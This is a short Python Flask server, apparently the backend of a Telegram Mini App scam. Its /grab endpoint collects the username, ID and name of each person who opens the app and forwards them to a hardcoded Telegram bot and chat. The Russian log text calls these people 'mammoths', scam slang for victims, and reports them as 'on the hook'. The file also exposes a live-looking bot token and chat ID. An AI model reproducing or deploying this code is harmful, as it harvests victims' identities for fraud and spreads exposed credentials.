import os
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# --- ТВОИ ДАННЫЕ ВШИТЫ ---
TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
CHAT_ID = "-1003794470658"
# -------------------------

def send_to_tg(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        print(f"Error sending to TG: {e}")
        return None

@app.route('/')
def home():
    return "SERVER IS LIVE AND READY FOR LOGS!"

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.json
        # Собираем инфу о мамонте
        user = data.get('username', 'Unknown')
        uid = data.get('user_id', 'Unknown')
        name = data.get('first_name', 'No name')
        
        log_message = (
            f"🎯 <b>МАМОНТ НА КРЮЧКЕ!</b>\n\n"
            f"👤 <b>Имя:</b> {name}\n"
            f"🔗 <b>Юзер:</b> @{user}\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
            f"⚙️ <i>Статус: Открыл Mini App</i>"
        )
        
        send_to_tg(log_message)
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in grab: {e}")
        return jsonify({"status": "error"}), 500

# Тестовое сообщение при запуске
with app.app_context():
    print("Sending startup notification...")
    send_to_tg("🚀 <b>СИСТЕМА ЗАПУЩЕНА!</b>\n\nТвой сервер на Render теперь видит бота. Жди логи, брат!")

if __name__ == '__main__':
    # Render сам подставит порт, если нет - берем 8080
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
 

